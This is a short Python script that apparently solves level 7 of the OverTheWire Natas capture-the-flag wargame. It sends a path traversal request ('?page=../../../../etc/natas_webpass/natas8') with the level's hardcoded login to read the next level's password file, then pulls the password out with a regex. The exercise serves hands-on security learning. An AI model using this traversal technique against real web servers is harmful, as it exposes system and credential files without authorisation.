import requests
import re

username = 'natas7'
password = 'jmxSiH3SP6Sonf8dv66ng8v1cIEdjXWr'

url = f"http://{username}.natas.labs.overthewire.org/" + "?page=../../../../../../../etc/natas_webpass/natas8"

response = requests.get(url, auth = (username, password) )

# print(response.text)

print(re.findall('<br>\n(.*)\n\n<!--', response.text)[0])
